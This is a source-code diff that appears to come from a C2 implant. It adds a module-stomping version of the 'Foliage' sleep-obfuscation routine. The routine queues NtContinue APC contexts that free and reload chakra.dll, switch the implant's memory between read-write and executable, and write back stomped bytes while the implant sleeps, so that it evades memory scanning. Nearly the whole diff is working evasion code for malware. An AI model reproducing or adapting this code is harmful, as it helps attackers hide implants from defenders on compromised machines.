@@ -8,11 +8,167 @@ FUNC VOID volatile ___chkstk_ms(
 FUNC VOID SleepMain(
     DWORD SleepTime
 ) {
-    BLACKOUT_INSTANCE
-
     FoliageObf( SleepTime );
 }
 
+#ifdef BK_STOMP
+FUNC VOID FoliageObf( 
+    DWORD SleepTime
+) {
+    BLACKOUT_INSTANCE
+    
+    LONG   Status     = 0x00;
+
+    HANDLE EvtSync       = NULL;
+    HANDLE hDuplicateObj = NULL;
+    HANDLE hSlpThread    = NULL;
+    HANDLE hMainThread   = NULL;
+
+    CHAR    LibraryFr[]= { 'c', 'h', 'a', 'k', 'r', 'a', '.', 'd', 'l', 'l', 0 }; // todo: string encryption
+    HMODULE hLibraryFr = Instance()->Win32.GetModuleHandleA( LibraryFr ); // todo: get module using LdrModuleAddr | discover hash of the chacrka.dll
+    PVOID   OldProt    = NULL;
+
+    CONTEXT CtxMain   = { 0 };
+    CONTEXT CtxBackup = { 0 };
+    CONTEXT CtxSpoof  = { 0 };
+
+    CONTEXT RopSetEvt = { 0 };
+    CONTEXT RopFreeLb = { 0 };
+    CONTEXT RopLoadLb = { 0 };
+    CONTEXT RopDelay  = { 0 };
+    CONTEXT RopImpBcp = { 0 };
+    CONTEXT RopProtRw = { 0 };
+    CONTEXT RopProtRx = { 0 };
+    CONTEXT RopExit   = { 0 };
+
+    Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
+    if ( Status != 0x00 ) {
+        //PrintErr( "NtCreateEvent", Status );
+    }    
+
+    Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
+    if ( Status != 0x00 ) {
+        //PrintErr( "NtCreateThreadEx", Status );
+    }
+
+    Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );
+
+    CtxMain.ContextFlags = CONTEXT_FULL;
+    Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
+    if ( Status != 0x00 ) {
+        //PrintErr( "NtGetContextThread", Status );
+    }
+
+    *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;
+
+    MmCopy( &RopSetEvt, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopFreeLb, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopLoadLb, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopDelay,  &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopProtRx, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopProtRw, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopImpBcp, &CtxMain, sizeof( CONTEXT ) );
+    MmCopy( &RopExit,   &CtxMain, sizeof( CONTEXT ) );
+
+    /* 
+     * wait EvtSync gets triggered
+     * NtWaitForGingleObject( EvtSync, FALSE, NULL ); 
+     */
+    RopSetEvt.Rip = Instance()->Win32.NtWaitForSingleObject;
+    RopSetEvt.Rcx = EvtSync;
+    RopSetEvt.Rdx = FALSE;
+    RopSetEvt.R9  = NULL;
+
+    /*
+     * Change implant protection to RW
+     * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
+     */
+    RopFreeLb.Rip = Instance()->Win32.FreeLibrary;
+    RopFreeLb.Rcx = hLibraryFr;
+
+    /*
+     * memory encryption
+     * SystemFunction040( BaseAddress, FullLength );
+     */
+    RopLoadLb.Rip = Instance()->Win32.LoadLibraryA;
+    RopLoadLb.Rcx = LibraryFr;
+
+    /*
+     * delay
+     * WaitForSingleObjectEx( NtCurrentProcess(), SleepTime, FALSE );
+     */
+    RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
+    RopDelay.Rcx = NtCurrentProcess();
+    RopDelay.Rdx = SleepTime;
+    RopDelay.R8  = FALSE;
+
+    RopProtRw.Rip = Instance()->Win32.VirtualProtect;
+    RopProtRw.Rcx = Instance()->Base.Buffer;
+    RopProtRw.Rdx = Instance()->Base.FullLen;
+    RopProtRw.R8  = PAGE_READWRITE;
+    RopProtRw.R9  = &OldProt; 
+
+    /*
+     * memory decryption
+     * SystemFunction041( BaseAddress, FullLength );
+     */
+    RopImpBcp.Rip = Instance()->Win32.WriteProcessMemory;
+    RopImpBcp.Rcx = NtCurrentProcess();
+    RopImpBcp.Rdx = Instance()->Base.Buffer;
+    RopImpBcp.R8  = Instance()->StompArgs->Backup;
+    RopImpBcp.R9  = Instance()->StompArgs->Length;
+
+    RopProtRx.Rip = Instance()->Win32.VirtualProtect;
+    RopProtRx.Rcx = Instance()->Base.RxBase;
+    RopProtRx.Rdx = Instance()->Base.RxSize;
+    RopProtRx.R8  = PAGE_EXECUTE_READ;
+    RopProtRx.R9  = &OldProt;
+    
+    /*
+     * exit thread
+     * RtlExitUserThread( 0x00 );
+     */
+    RopExit.Rip = Instance()->Win32.RtlExitUserThread;
+    RopExit.Rcx = 0x00;
+
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFreeLb, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopLoadLb, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopImpBcp, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );
+
+    Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
+    if ( Status != 0x00 ) {
+        //PrintErr( "NtAlertResumeThread", Status );
+    }
+
+    CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
+    //CtxSpoof.Rsp = Instance()->Teb->NtTib.StackBase;
+
+    Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
+
+    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
+    if ( Status != 0x00 ) {
+        //PrintErr( "NtSignalAndWaitForSingleObject", Status );
+    }
+
+    //HeapDeobf();
+
+_LeaveObf:
+    if ( EvtSync ) {
+        Instance()->Win32.CloseHandle( EvtSync );
+        EvtSync = NULL;
+    }
+
+    if ( hSlpThread ) {
+        Instance()->Win32.CloseHandle( hSlpThread );
+        hSlpThread = NULL;
+    }
+}    
+#else
 FUNC VOID FoliageObf( 
     DWORD SleepTime
 ) {
@@ -41,8 +197,6 @@ FUNC VOID FoliageObf(
     CONTEXT RopProtRx = { 0 };
     CONTEXT RopFixCtx = { 0 }; 
     CONTEXT RopExit   = { 0 };
-
-    //HeapObf();
 
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) {
@@ -188,8 +342,6 @@ FUNC VOID FoliageObf(
         //PrintErr( "NtSignalAndWaitForSingleObject", Status );
     }
 
-    //HeapDeobf();
-
 _LeaveObf:
     if ( EvtSync ) {
         Instance()->Win32.CloseHandle( EvtSync );
@@ -201,6 +353,7 @@ _LeaveObf:
         hSlpThread = NULL;
     }
 }    
+#endif
 
 FUNC BOOL CfgCheckEnabled(
     VOID
